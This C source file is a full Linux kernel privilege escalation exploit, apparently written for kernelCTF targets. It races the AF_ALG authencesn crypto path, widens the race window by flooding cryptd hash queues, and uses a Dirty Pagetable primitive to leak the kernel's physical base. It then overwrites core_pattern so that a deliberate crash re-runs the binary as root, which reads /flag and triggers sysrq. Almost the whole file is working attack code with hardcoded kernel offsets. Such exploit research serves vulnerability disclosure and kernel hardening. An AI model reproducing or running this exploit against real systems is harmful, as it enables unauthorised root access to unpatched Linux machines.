#define _GNU_SOURCE
#include <stdbool.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/syscall.h>
#include <linux/if_alg.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sched.h>
#include <err.h>

#include <xdk/core.h>

extern char **environ;

#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef CRYPTO_AUTHENC_KEYA_PARAM
#define CRYPTO_AUTHENC_KEYA_PARAM 1
#endif

// AEAD parameters for authenc/authencesn.
#define AUTH_TAG_SIZE 16 /* HMAC-SHA256 tag truncated to 16 bytes. */
#define AEAD_IV_SIZE 16  /* AES-CBC IV size. */

// Hash flood parameters used to widen the race window.
#define FLOOD_THREADS 16
#define FLOOD_BUF_SIZE (8 * 1024 * 1024)

// Fixed-address mapping region used for Dirty pagetable attack.
#define PAGE_SIZE_BYTES 0x1000
#define SPRAY_PAGE_COUNT 0x400
#define SPRAY_REGION_BASE 0x20000000ull
#define SPRAY_REGION_STEP 0x200000ull

// Fake AEAD setup parameters (pipe + splice).
#define FAKE_AEAD_PIPE_COUNT 4
#define FAKE_AEAD_PIPE_BUF_SIZE 0x100
// Short header length required for the fake AEAD setup path.
#define FAKE_AEAD_HEAD_LEN 3
// Splice chunk size used to extend the scatterlist.
#define FAKE_AEAD_SPLICE_LEN 9

// Race marker / sentinel bytes.
#define RACE_PAGE_INIT_BYTE 'a'
#define SPRAY_SENTINEL_BYTE 'b'
#define RACE_MARKER_SHIFT 24
#define RACE_MARKER_VALUE 1
#define RACE_WORD_SIZE (sizeof(uint32_t))

// Payload injected into core_pattern.
#define CORE_PATTERN_PAYLOAD "|/proc/%P/exe %P"
#define CORE_PATTERN_PAYLOAD_LEN (sizeof(CORE_PATTERN_PAYLOAD) - 1)

// PTE bit helpers for crafting the PTE value.
#define PTE_ADDR_SHIFT 8
// PTE flags for user RW mapping: present|rw|user|accessed|dirty.
#define PTE_USER_RW_FLAGS 0x67
// Marker bit ORed into the PTE candidate.
#define PTE_ADDR_MARKER 0x8

// Placeholder PTE value used before we have a physical leak.
// This encodes a user RW PTE (0x000009c067) that points at the fixed
// page-table page (phys 0x9c000) used by the Dirty Pagetable technique to
// read the brk_base PTE and derive the kernel physical base. We store it
// shifted because only bytes 1..4 of the PTE are swapped.
#define DEFAULT_PTE_PLACEHOLDER (0x000009c067 >> PTE_ADDR_SHIFT)

// Authenc key sizes for the authencesn trigger.
#define AUTHENC_KEY_BUF_SIZE 128
#define AUTHENC_AUTH_KEY_LEN 20
#define AUTHENC_ENC_KEY_LEN 16

// Fake authenc key sizes for the fake AEAD object.
#define AUTHENC_FAKE_AUTH_KEY_LEN 32
#define AUTHENC_FAKE_ENC_KEY_LEN 16

// Control message buffer sizes for sendmsg/recvmsg.
#define AUTHENCESN_CMSG_BUF_SIZE \
    (CMSG_SPACE(sizeof(uint32_t)) + \
     CMSG_SPACE(sizeof(uint32_t)) + \
     CMSG_SPACE(sizeof(struct af_alg_iv) + AEAD_IV_SIZE))

#define FAKE_AEAD_CMSG_BUF_SIZE \
    (CMSG_SPACE(sizeof(uint32_t)) + \
     CMSG_SPACE(sizeof(struct af_alg_iv) + AEAD_IV_SIZE))

struct crypto_authenc_key_param {
    uint32_t enckeylen;
};

typedef struct exploit_ctx {
    uint8_t *race_page;                  // Shared page used by the race primitive.
    char *spray_pages[SPRAY_PAGE_COUNT]; // Fixed-address pages used for Dirty pagetable.
    size_t stext_phys_base;              // Physical base of _stext (leaked).
    int sync_fds[2];                     // IPC channel between parent/child for the leak.
    int flood_stop;                      // Stop flag for hash flood threads.
    uint64_t core_pattern_offset;        // Offset within the core_pattern page.
    uint64_t core_pattern_base;          // Page-aligned core_pattern base.
    uint64_t brk_base;                   // brk_base symbol offset (used to derive _stext phys).
} exploit_ctx;

typedef struct race_ctx {
    exploit_ctx *ctx;
    int cpu;
} race_ctx;

typedef struct flood_ctx {
    int opfd;
    uint8_t *buf;
    size_t len;
    int cpu;
    int *stop;
} flood_ctx;

typedef struct flood_state {
    flood_ctx ctx[FLOOD_THREADS];
    pthread_t tid[FLOOD_THREADS];
} flood_state;

typedef struct aead_request_msg {
    uint8_t tag[AUTH_TAG_SIZE];          // Auth tag output buffer.
    struct iovec iov;                    // Single-iov auth tag buffer.
    struct msghdr msg;                   // sendmsg/recvmsg header.
    char cbuf[AUTHENCESN_CMSG_BUF_SIZE]; // Control messages (op, assoc len, IV).
} aead_request_msg;

INCBIN(target_db, "target_db.kxdb");

// Simple errno-checked syscall helper for consistent error reporting.
#define SYSCHK(x) ({ \
    __typeof__(x) __res = (x); \
    if (__res == (__typeof__(x))-1) \
        err(1, "SYSCHK(" #x ")"); \
    __res; \
})

// Atomics for a single stop flag used by multiple threads.
#define ATOMIC_LOAD(ptr) __atomic_load_n((ptr), __ATOMIC_RELAXED)
#define ATOMIC_STORE(ptr, val) __atomic_store_n((ptr), (val), __ATOMIC_RELAXED)

static void setup_cpu_affinity(int cpu)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    SYSCHK(sched_setaffinity(0, sizeof(mask), &mask));
}

static void die(const char *msg)
{
    perror(msg);
    exit(1);
}

struct target_offsets {
    const char *distro;
    const char *release;
    uint64_t core_pattern_off;
    uint64_t brk_base_off;
};

// Offsets are relative to the _stext base (0xffffffff81000000).
#define STEXT_BASE 0xffffffff81000000ull
// Fallback offsets if the kxdb does not contain these symbols yet.
static const target_offsets kKnownTargets[] = {
    {"kernelctf", "lts-6.12.62",
     0xffffffff84610900ull - STEXT_BASE,
     0xffffffff85a00000ull - STEXT_BASE},
    {"kernelctf", "mitigation-v4-6.12",
     0xffffffff8421b460ull - STEXT_BASE,
     0xffffffff85400000ull - STEXT_BASE},
    {"kernelctf", "cos-121-18867.294.66",
     0xffffffff83fb3440ull - STEXT_BASE,
     0xffffffff85200000ull - STEXT_BASE},
};

static bool resolve_target_offsets(Target *target, uint64_t *core_pattern_off,
                                   uint64_t *brk_base_off)
{
    try {
        *core_pattern_off = target->GetSymbolOffset("core_pattern");
        *brk_base_off = target->GetSymbolOffset("brk_base");
        return true;
    } catch (const ExpKitError &) {
    }

    const char *distro = target->GetDistro().c_str();
    const char *release = target->GetReleaseName().c_str();
    for (const auto &entry : kKnownTargets) {
        if (strcmp(distro, entry.distro) == 0 &&
            strcmp(release, entry.release) == 0) {
            target->AddSymbol("core_pattern", entry.core_pattern_off);
            target->AddSymbol("brk_base", entry.brk_base_off);
            *core_pattern_off = entry.core_pattern_off;
            *brk_base_off = entry.brk_base_off;
            return true;
        }
    }
    return false;
}

static bool setup_target_offsets(exploit_ctx *ctx)
{
    try {
        // Use kxdb auto-detection so we do not hardcode target version checks.
        TargetDb kxdb("target_db.kxdb", target_db);
        Target target = kxdb.AutoDetectTarget();
        printf("[+] target: %s %s\n", target.GetDistro().c_str(),
               target.GetReleaseName().c_str());

        uint64_t core_pattern_off = 0;
        uint64_t brk_base_off = 0;
        if (!resolve_target_offsets(&target, &core_pattern_off, &brk_base_off)) {
            fprintf(stderr, "[-] missing core_pattern/brk_base offsets\n");
            return false;
        }

        ctx->core_pattern_offset = core_pattern_off & 0xfffull;
        ctx->core_pattern_base = core_pattern_off & ~0xfffull;
        ctx->brk_base = brk_base_off;
        return true;
    } catch (const ExpKitError &e) {
        fprintf(stderr, "[-] target detection failed: %s\n", e.what());
        return false;
    }
}

static int setup_authenc_aead_opfd(const char *salg_name)
{
    int tfmfd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (tfmfd == -1) {
        perror("socket(AF_ALG)");
        return -1;
    }

    struct sockaddr_alg alg_addr;
    memset(&alg_addr, 0, sizeof(alg_addr));
    alg_addr.salg_family = AF_ALG;
    snprintf((char *)alg_addr.salg_type,
             sizeof(alg_addr.salg_type), "%s", "aead");
    snprintf((char *)alg_addr.salg_name,
             sizeof(alg_addr.salg_name), "%s", salg_name);

    if (bind(tfmfd, (struct sockaddr *)&alg_addr,
             sizeof(alg_addr)) == -1) {
        perror("bind(AF_ALG)");
        close(tfmfd);
        return -1;
    }

    // Key structure layout: rtattr header + auth key + enc key.
    struct {
        struct rtattr attr;
        struct crypto_authenc_key_param param;
        unsigned char authkey[AUTHENC_FAKE_AUTH_KEY_LEN];
        unsigned char enckey[AUTHENC_FAKE_ENC_KEY_LEN];
    } __attribute__((packed)) key;
    memset(&key, 0, sizeof(key));
    key.attr.rta_len = RTA_LENGTH(sizeof(struct crypto_authenc_key_param));
    key.attr.rta_type = CRYPTO_AUTHENC_KEYA_PARAM;
    key.param.enckeylen = htonl(AUTHENC_FAKE_ENC_KEY_LEN);

    if (setsockopt(tfmfd, SOL_ALG, ALG_SET_KEY, &key, sizeof(key)) == -1) {
        perror("setsockopt(ALG_SET_KEY)");
        close(tfmfd);
        return -1;
    }

    int opfd = accept(tfmfd, NULL, NULL);
    if (opfd == -1) {
        perror("accept(AF_ALG)");
        close(tfmfd);
        return -1;
    }

    close(tfmfd);
    return opfd;
}

static int vuln_setup_fake_aead_opfd()
{
    uint8_t iv[AEAD_IV_SIZE];
    uint8_t fake_aead_buf[FAKE_AEAD_PIPE_BUF_SIZE];
    struct iovec iov;
    struct msghdr aead_msg;
    struct cmsghdr *control = NULL;
    char cbuf[FAKE_AEAD_CMSG_BUF_SIZE];
    memset(iv, 0, sizeof(iv));
    memset(fake_aead_buf, 0, sizeof(fake_aead_buf));
    memset(&iov, 0, sizeof(iov));
    memset(&aead_msg, 0, sizeof(aead_msg));
    memset(cbuf, 0, sizeof(cbuf));
    int pipes[FAKE_AEAD_PIPE_COUNT][2];

    // Setup a standard authenc AEAD and craft a short header to steer the
    // kernel into the target path for the fake object and RX SGL layout.
    // authencesn later runs with outlen=0 (RX SGL not built), so it reuses
    // this stale RX SGL from the freed areq. This function pre-shapes that
    // RX SGL (via pipe+splice) to control where dst[0..7] lands.
    int opfd = setup_authenc_aead_opfd("authenc(hmac(sha256),cbc(aes))");
    if (opfd < 0) {
        return -1;
    }

    for (size_t i = 0; i < FAKE_AEAD_PIPE_COUNT; i++) {
        SYSCHK(pipe(pipes[i]));
        write(pipes[i][1], fake_aead_buf, sizeof(fake_aead_buf));
    }

    // Pipes provide non-contiguous backing pages, which helps us create an
    // RX SGL spanning multiple pages (needed for the inter-page swap).
    // These pipe-backed pages later get PTEs when we mmap-spray fixed pages.
    aead_msg.msg_control = cbuf;
    aead_msg.msg_controllen = sizeof(cbuf);

    control = CMSG_FIRSTHDR(&aead_msg);
    control->cmsg_level = SOL_ALG;
    control->cmsg_type = ALG_SET_OP;
    control->cmsg_len = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(control) = ALG_OP_DECRYPT;

    control = CMSG_NXTHDR(&aead_msg, control);
    control->cmsg_level = SOL_ALG;
    control->cmsg_type = ALG_SET_IV;
    control->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + sizeof(iv));
    struct af_alg_iv *aiv =
        (struct af_alg_iv *)CMSG_DATA(control);
    aiv->ivlen = sizeof(iv);
    memcpy(aiv->iv, iv, sizeof(iv));

    // Short header; follow up with splice() to craft the backing scatterlist.
    // These sizes are chosen to shape the later RX SGL layout (offset-1 pipe
    // segment for the PTE byte skip).
    iov.iov_base = fake_aead_buf;
    iov.iov_len = FAKE_AEAD_HEAD_LEN;
    aead_msg.msg_iov = &iov;
    aead_msg.msg_iovlen = 1;

    // Start the request with a small header, then extend with splice.
    SYSCHK(sendmsg(opfd, &aead_msg, MSG_MORE));
    for (size_t i = 0; i < FAKE_AEAD_PIPE_COUNT; i++) {
        int more = (i + 1 == FAKE_AEAD_PIPE_COUNT) ? 0 : SPLICE_F_MORE;
        SYSCHK(splice(pipes[i][0], 0, opfd, 0, FAKE_AEAD_SPLICE_LEN, more));
    }

    for (size_t i = 0; i < FAKE_AEAD_PIPE_COUNT; i++) {
        close(pipes[i][0]);
        close(pipes[i][1]);
    }
    return opfd;
}

static void vuln_finalize_fake_aead(exploit_ctx *ctx, int opfd)
{
    struct iovec iov[2];
    struct msghdr aead_msg;
    memset(iov, 0, sizeof(iov));
    memset(&aead_msg, 0, sizeof(aead_msg));

    iov[0].iov_base = ctx->race_page;
    iov[0].iov_len = RACE_WORD_SIZE;

    aead_msg.msg_iov = iov;
    aead_msg.msg_iovlen = 2;

    // This recvmsg is expected to fail: msg_iovlen=2 but iov[1] is NULL.
    // The kernel still allocates and populates the RX SGL pointing at our user
    // page, then frees struct af_alg_async_req, leaving the SGL data in heap
    recvmsg(opfd, &aead_msg, 0);
}

static size_t util_build_authenc_key(uint8_t *buf, size_t buflen,
                                     const uint8_t *authkey, size_t authkeylen,
                                     const uint8_t *enckey, size_t enckeylen)
{
    // Format key buffer for ALG_SET_KEY: rtattr + authkey + enckey.
    size_t rta_len = RTA_LENGTH(sizeof(struct crypto_authenc_key_param));
    if (buflen < rta_len + authkeylen + enckeylen) {
        return 0;
    }

    struct rtattr *rta = (struct rtattr *)buf;
    rta->rta_type = CRYPTO_AUTHENC_KEYA_PARAM;
    rta->rta_len = rta_len;

    struct crypto_authenc_key_param *param =
        (struct crypto_authenc_key_param *)RTA_DATA(rta);
    param->enckeylen = htonl((uint32_t)enckeylen);

    memcpy(buf + rta_len, authkey, authkeylen);
    memcpy(buf + rta_len + authkeylen, enckey, enckeylen);
    return rta_len + authkeylen + enckeylen;
}

static void *race_capture_thread(void *arg)
{
    race_ctx *rctx = (race_ctx *)arg;
    exploit_ctx *ctx = rctx->ctx;

    // Pin the capture thread to the sibling core to increase race hit rate.
    setup_cpu_affinity(rctx->cpu ^ 1);

    for (;;) {
        // The kernel writes 4-byte phys address from PTE into race_page when
        // the authencesn path touches our crafted dst scatterlist.
        volatile uint32_t *pbuf_u32 =
            (volatile uint32_t *)ctx->race_page;
        uint32_t marker = *pbuf_u32;

        if ((marker >> RACE_MARKER_SHIFT) == RACE_MARKER_VALUE) {
            // Race won: the header marker indicates the kernel wrote into our page.
            printf("race marker: race_page[0]=0x%08x\n", marker);
            // The authencesn swap touches dst[0:8]. With a two-segment RX SGL,
            // that swap crosses the user page and a sprayed PTE page.
            for (size_t i = 0; i < SPRAY_PAGE_COUNT; i++) {
                if (ctx->stext_phys_base == 0) {
                    if (ctx->spray_pages[i][0] != SPRAY_SENTINEL_BYTE) {
                        // A sprayed page lost its sentinel, indicating it was
                        // involved in the 4-byte swap with the user page.
                        // Use the corrupted page to leak a PTE, then derive _stext phys.
                        size_t leaked_pte =
                            *(size_t *)ctx->spray_pages[i];
                        size_t leaked_phys = leaked_pte & ~0xffffull;
                        // Derive _stext physical base using brk_base offset.
                        size_t stext_phys = leaked_phys - ctx->brk_base;
                        // Send the leak to the child process for stage 2.
                        write(ctx->sync_fds[1], &stext_phys,
                                         sizeof(stext_phys));
                        break;
                    }
                } else {
                    // After we know _stext phys, overwrite core_pattern with our payload.
                    // The same swap primitive now targets core_pattern's page.
                    memcpy(ctx->spray_pages[i] + ctx->core_pattern_offset,
                           CORE_PATTERN_PAYLOAD, CORE_PATTERN_PAYLOAD_LEN);
                }
            }
            break;
        }
    }
    return NULL;
}

static int setup_cryptd_hash_opfd()
{
    // cryptd(hmac) wraps a synchronous hash into async workqueues and queues
    // requests per-CPU, which we exploit by flooding.
    int tfmfd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (tfmfd < 0) {
        die("cryptd socket");
    }

    struct sockaddr_alg alg_addr;
    memset(&alg_addr, 0, sizeof(alg_addr));
    alg_addr.salg_family = AF_ALG;
    snprintf((char *)alg_addr.salg_type,
             sizeof(alg_addr.salg_type), "%s", "hash");
    snprintf((char *)alg_addr.salg_name,
             sizeof(alg_addr.salg_name), "%s", "cryptd(hmac(sha256-generic))");

    if (bind(tfmfd, (struct sockaddr *)&alg_addr,
             sizeof(alg_addr)) < 0) {
        die("cryptd bind");
    }

    uint8_t key[32];
    memset(key, 0x11, sizeof(key));
    if (setsockopt(tfmfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) < 0) {
        die("cryptd setkey");
    }

    int opfd = accept(tfmfd, NULL, 0);
    if (opfd < 0) {
        die("cryptd accept");
    }
    close(tfmfd);
    return opfd;
}

static void *spray_hash_thread(void *arg)
{
    flood_ctx *ctx = (flood_ctx *)arg;
    setup_cpu_affinity(ctx->cpu);

    struct iovec iov;
    struct msghdr msg;
    memset(&iov, 0, sizeof(iov));
    memset(&msg, 0, sizeof(msg));
    iov.iov_base = ctx->buf;
    iov.iov_len = ctx->len;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    for (;;) {
        if (ATOMIC_LOAD(ctx->stop)) {
            break;
        }

        // Hash flood keeps the kernel busy to widen the race window.
        // cryptd queues async work; flooding delays authencesn's hash callback.
        ssize_t n = sendmsg(ctx->opfd, &msg, 0);
        if (n < 0 && errno == EINTR) {
            continue;
        }
    }
    return NULL;
}

static void spray_start_hash_flood(flood_state *state, int *stop,
                                   int cpu)
{
    // Spawn multiple hash instances to apply CPU and allocator pressure.
    for (size_t i = 0; i < FLOOD_THREADS; i++) {
        state->ctx[i].opfd = setup_cryptd_hash_opfd();
        state->ctx[i].len = FLOOD_BUF_SIZE;
        state->ctx[i].cpu = cpu;
        state->ctx[i].stop = stop;

        if (posix_memalign((void **)&state->ctx[i].buf,
                           64, state->ctx[i].len) != 0) {
            die("posix_memalign");
        }
        memset(state->ctx[i].buf, (int)i, state->ctx[i].len);

        pthread_create(&state->tid[i], NULL, spray_hash_thread, &state->ctx[i]);
    }
}

static void spray_stop_hash_flood(flood_state *state)
{
    for (size_t i = 0; i < FLOOD_THREADS; i++) {
        pthread_join(state->tid[i], NULL);
        close(state->ctx[i].opfd);
        free(state->ctx[i].buf);
    }
}

static void setup_cryptd_hash_tfm()
{
    // Trigger the cryptd template so later hash sockets are fast.
    // We later flood cryptd queues to extend the swap window.
    int fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (fd < 0) {
        die("cryptd socket (setup)");
    }

    struct sockaddr_alg alg_addr;
    memset(&alg_addr, 0, sizeof(alg_addr));
    alg_addr.salg_family = AF_ALG;
    snprintf((char *)alg_addr.salg_type,
             sizeof(alg_addr.salg_type), "%s", "hash");
    snprintf((char *)alg_addr.salg_name,
             sizeof(alg_addr.salg_name), "%s", "cryptd(hmac(sha256-generic))");

    if (bind(fd, (struct sockaddr *)&alg_addr,
             sizeof(alg_addr)) < 0) {
        die("cryptd bind (setup)");
    }
    close(fd);
}

static bool postrip_check_core_pattern()
{
    // Verify the overwrite by reading the current core_pattern string.
    char core_pattern_buf[0x100];
    memset(core_pattern_buf, 0, sizeof(core_pattern_buf));
    int core_fd = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    if (core_fd < 0) {
        perror("open core_pattern");
        return false;
    }

    ssize_t n = read(core_fd, core_pattern_buf, sizeof(core_pattern_buf));
    close(core_fd);
    if (n < 0) {
        perror("read core_pattern");
        return false;
    }

    return strncmp(core_pattern_buf, CORE_PATTERN_PAYLOAD,
                   CORE_PATTERN_PAYLOAD_LEN) == 0;
}

static int vuln_setup_authencesn_opfd()
{
    // authencesn is the vulnerable AEAD variant used for the race.
    const char *alg_name = "authencesn(hmac(sha256),cbc(aes))";

    int tfmfd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (tfmfd < 0) {
        die("authencesn socket");
    }

    struct sockaddr_alg alg_addr;
    memset(&alg_addr, 0, sizeof(alg_addr));
    alg_addr.salg_family = AF_ALG;
    snprintf((char *)alg_addr.salg_type,
             sizeof(alg_addr.salg_type), "%s", "aead");
    snprintf((char *)alg_addr.salg_name,
             sizeof(alg_addr.salg_name), "%s", alg_name);

    if (bind(tfmfd, (struct sockaddr *)&alg_addr,
             sizeof(alg_addr)) < 0) {
        die("authencesn bind");
    }

    uint8_t authkey[AUTHENC_AUTH_KEY_LEN];
    uint8_t enckey[AUTHENC_ENC_KEY_LEN];
    memset(authkey, 0x11, sizeof(authkey));
    memset(enckey, 0x22, sizeof(enckey));

    uint8_t keybuf[AUTHENC_KEY_BUF_SIZE];
    size_t keylen = util_build_authenc_key(keybuf, sizeof(keybuf),
                                           authkey, sizeof(authkey),
                                           enckey, sizeof(enckey));
    if (keylen == 0) {
        errx(1, "authencesn key buffer too small");
    }

    if (setsockopt(tfmfd, SOL_ALG, ALG_SET_KEY, keybuf, keylen) < 0) {
        die("authencesn setkey");
    }

    // authsize determines tag length used for tag-only decrypt.
    if (setsockopt(tfmfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL,
                   AUTH_TAG_SIZE) < 0) {
        die("authencesn setauthsize");
    }

    int opfd = accept(tfmfd, NULL, 0);
    if (opfd < 0) {
        die("authencesn accept");
    }
    close(tfmfd);
    return opfd;
}

static void vuln_init_authencesn_msg(aead_request_msg *req)
{
    // Build control messages for decrypt op with IV and zero assoc data.
    // assoclen=0 and tag-only input make outlen=0, so RX SGL is not built.
    // authencesn still performs the 4-byte swap before the hash check.
    memset(req, 0, sizeof(*req));

    // Tag-only decrypt: provide only the auth tag as input.
    req->iov.iov_base = req->tag;
    req->iov.iov_len = sizeof(req->tag);

    req->msg.msg_iov = &req->iov;
    req->msg.msg_iovlen = 1;
    req->msg.msg_control = req->cbuf;
    req->msg.msg_controllen = sizeof(req->cbuf);

    struct cmsghdr *control = CMSG_FIRSTHDR(&req->msg);
    control->cmsg_level = SOL_ALG;
    control->cmsg_type = ALG_SET_OP;
    control->cmsg_len = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(control) = ALG_OP_DECRYPT;

    control = CMSG_NXTHDR(&req->msg, control);
    control->cmsg_level = SOL_ALG;
    control->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
    control->cmsg_len = CMSG_LEN(sizeof(uint32_t));
    // assoclen=0 ensures outlen==used-authsize==0 for tag-only decrypt.
    *(uint32_t *)CMSG_DATA(control) = 0;

    control = CMSG_NXTHDR(&req->msg, control);
    control->cmsg_level = SOL_ALG;
    control->cmsg_type = ALG_SET_IV;
    control->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + AEAD_IV_SIZE);
    struct af_alg_iv *iv =
        (struct af_alg_iv *)CMSG_DATA(control);
    iv->ivlen = AEAD_IV_SIZE;
    memset(iv->iv, 0, AEAD_IV_SIZE);
}

int main(int argc, char **argv)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    if (argc > 1) {
        // Executed by core_pattern with root privileges.
        int pid = strtoull(argv[1], NULL, 10);
        int pfd = syscall(SYS_pidfd_open, pid, 0);
        int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
        int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
        int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
        dup2(stdinfd, 0);
        dup2(stdoutfd, 1);
        dup2(stderrfd, 2);

        system("cat /flag");
        system("cat /flag");
        system("cat /flag;echo o>/proc/sysrq-trigger");
        exit(0);
    }

    exploit_ctx ctx;
    memset(&ctx, 0, sizeof(ctx));
    ATOMIC_STORE(&ctx.flood_stop, 0);

    if (!setup_target_offsets(&ctx)) {
        return 1;
    }

    // step(0): Setup coordination and CPU affinity
    int main_cpu = 0;
    SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, ctx.sync_fds));
    setup_cpu_affinity(main_cpu);

    // Two-process pipeline: parent leaks _stext phys, child waits for it.
    pid_t leak_child = fork();
    if (leak_child == -1) {
        die("fork");
    }
    if (leak_child == 0) {
        main_cpu = 1;
        setup_cpu_affinity(main_cpu);
        // Child waits for _stext phys leak before continuing.
        read(ctx.sync_fds[0], &ctx.stext_phys_base, sizeof(ctx.stext_phys_base));
    }

    // Warm up cryptd so flooding later extends the authencesn hash window.
    setup_cryptd_hash_tfm();

    // step(1): Prepare fake authenc object
    int fake_aead_opfd = vuln_setup_fake_aead_opfd();
    if (fake_aead_opfd < 0) {
        die("vuln_setup_fake_aead_opfd");
    }

    // race_page serves as the user-mapped page for the 4-byte swap primitive.
    ctx.race_page = (uint8_t *)mmap(NULL, PAGE_SIZE_BYTES, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANON, -1, 0);
    ctx.race_page[0] = RACE_PAGE_INIT_BYTE;

    // step(2): Setup authencesn context
    int authencesn_opfd = vuln_setup_authencesn_opfd();
    aead_request_msg authencesn_msg;
    vuln_init_authencesn_msg(&authencesn_msg);

    // step(3): Start race helpers
    pthread_t race_tid;
    race_ctx rctx;
    memset(&rctx, 0, sizeof(rctx));
    rctx.ctx = &ctx;
    rctx.cpu = main_cpu;
    puts("capture race thread started");
    pthread_create(&race_tid, NULL, race_capture_thread, &rctx);

    flood_state flood;
    memset(&flood, 0, sizeof(flood));
    // Flood cryptd queues so authencesn's async hash is delayed.
    spray_start_hash_flood(&flood, &ctx.flood_stop, main_cpu);

    // step(4): Queue authencesn request
    // authencesn uses dst and performs the 4-byte swap, giving a swap primitive
    // across our crafted scatterlist segments (PTE page + user page).
    SYSCHK(sendmsg(authencesn_opfd, &authencesn_msg.msg, 0));
    puts("go");

    // step(5): Map fixed pages for Dirty pagetable attack
    // Fixed mappings make it easier to locate the sprayed PTE page after swap.
    char *spray_base = (char *)SPRAY_REGION_BASE;
    for (size_t i = 0; i < SPRAY_PAGE_COUNT; i++) {
        ctx.spray_pages[i] = (char *)mmap(spray_base + SPRAY_REGION_STEP * i,
                              PAGE_SIZE_BYTES, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANON | MAP_FIXED,
                              -1, 0);
    }

    // step(6): Finalize fake authenc object
    vuln_finalize_fake_aead(&ctx, fake_aead_opfd);

    uint8_t recv_out[0x100];
    memset(recv_out, 0, sizeof(recv_out));
    struct iovec recv_iov;
    struct msghdr recv_msg;
    memset(&recv_iov, 0, sizeof(recv_iov));
    memset(&recv_msg, 0, sizeof(recv_msg));
    recv_iov.iov_base = recv_out;
    recv_iov.iov_len = sizeof(recv_out);
    recv_msg.msg_iov = &recv_iov;
    recv_msg.msg_iovlen = 1;

    // Fill the first byte to allocate PTE and so we can detect which page was swapped.
    for (size_t i = 0; i < SPRAY_PAGE_COUNT; i++) {
        ctx.spray_pages[i][0] = SPRAY_SENTINEL_BYTE;
    }

    // step(7): Stage-specific race page PTE setup (parent placeholder vs child target)
    if (ctx.stext_phys_base != 0) {
        // Convert the leaked _stext phys into a core_pattern PTE candidate.
        // Only 4 bytes are swapped, so we encode upper PFN bytes and keep
        // the lower flags intact to preserve a valid PTE.
        size_t pte_addr = ctx.stext_phys_base + ctx.core_pattern_base;
        pte_addr >>= PTE_ADDR_SHIFT;
        pte_addr |= PTE_ADDR_MARKER;
        printf("target: %zx\n", (pte_addr << PTE_ADDR_SHIFT) | PTE_USER_RW_FLAGS);
        *(uint32_t *)ctx.race_page = (uint32_t)pte_addr;
    } else {
        // Parent stage: no leak yet, keep a brk_base placeholder PTE value.
        // Child stage will overwrite this with the computed core_pattern PTE.
        *(uint32_t *)ctx.race_page = DEFAULT_PTE_PLACEHOLDER;
    }

    // step(8): Trigger authencesn race (recvmsg)
    puts("trigger now");
    // recvmsg completes the decrypt path; swap happens before hash completion.
    ssize_t recv_ret = recvmsg(authencesn_opfd, &recv_msg, 0);
    fprintf(stderr, "recvmsg ret=%zd errno=%d\n", recv_ret, errno);

    ATOMIC_STORE(&ctx.flood_stop, 1);
    spray_stop_hash_flood(&flood);
    pthread_join(race_tid, NULL);
    puts("race thread end");

    if (ctx.stext_phys_base != 0) {
        if (fork() == 0) {
            if (!postrip_check_core_pattern()) {
                puts("retry..");
                execve("/proc/self/exe", argv, environ);
                // @sleep(desc="sleep to avoid kernel panic while exiting the binary")
                sleep(10000);
            }
            setsid();
            puts("root shell !!");
            // Trigger a crash to execute our core_pattern payload.
            *(volatile size_t *)0 = 0;
        }
    }
    else {
        // @sleep(desc="sleep to avoid kernel panic while exiting the binary")
        sleep(10000);
    }

    close(authencesn_opfd);
    close(fake_aead_opfd);
    return 0;
}
